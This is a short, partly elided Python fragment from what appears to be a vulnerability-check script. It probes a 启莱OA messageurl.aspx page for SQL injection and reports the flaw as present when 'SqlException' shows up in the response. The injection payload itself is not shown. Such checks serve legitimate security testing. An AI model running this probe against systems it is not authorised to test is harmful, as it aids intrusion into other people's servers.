...
def main(target_url):
    ...
    console.print(now_time() + " [INFO]     正在检测启莱OA messageurl.aspx SQL注入漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(vuln_url, headers=headers, verify=False)
        if "SqlException" in respones.text:
            console.print(now_time() + ' [SUCCESS]  启莱OA messageurl.aspx SQL注入漏洞 存在{}'.format(vuln_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  启莱OA messageurl.aspx SQL注入漏洞不存在', style='bold red ')
    except:
